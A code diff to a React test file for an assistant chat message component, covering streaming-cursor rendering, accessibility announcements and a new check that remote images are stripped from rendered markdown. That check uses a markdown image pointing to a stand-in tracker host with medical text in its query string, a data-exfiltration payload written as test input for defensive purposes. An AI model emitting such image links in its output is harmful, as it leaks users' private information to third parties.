@@ -26,14 +26,28 @@ describe("AssistantMessage", () => {
     const body = container.querySelector(".agent-msg__body")
     expect(body?.querySelector("h2")).toBeTruthy()
     expect(body?.querySelector("strong")?.textContent).toBe("重点")
-    // 流式光标与正文是兄弟节点，不会混进 Markdown 内容里。
-    expect(body?.querySelector(".caret-blink")).toBeTruthy()
+    // 光标由 `.markdown-body.is-streaming` 的最后一块画出行末，不再是游离的兄弟节点。
+    expect(body?.querySelector(".markdown-body.is-streaming")).toBeTruthy()
+    expect(body?.getAttribute("aria-busy")).toBe("true")
+    // 流式播报走隐藏 status，不给正文本身挂 aria-live（否则每 60ms 重念全文）。
+    expect(container.querySelector('[role="status"]')?.textContent).toBe("Iris 正在生成回答")
   })
 
-  it("结束后不再显示流式光标", () => {
+  it("结束后不再显示流式光标，并播报生成完毕", () => {
     const { container } = render(<AssistantMessage msg={assistant({ content: "答" })} />)
-    expect(container.querySelector(".caret-blink")).toBeNull()
     expect(container.querySelector(".is-streaming")).toBeNull()
+    expect(container.querySelector(".agent-msg__body")?.getAttribute("aria-busy")).toBeNull()
+    // 历史消息挂载时保持安静，不播报「回答已生成」。
+    expect(container.querySelector('[role="status"]')).toBeNull()
+  })
+
+  it("正文里的远程图片被丢掉：不让第三方追踪像素外带医学文本", () => {
+    const { container } = render(
+      <AssistantMessage
+        msg={assistant({ content: "![x](https://tracker.example/t.gif?d=眼压偏高)" })}
+      />,
+    )
+    expect(container.querySelector("img")).toBeNull()
   })
 
   it("代码块保留复制按钮，并能取到 data-code 的原文", async () => {
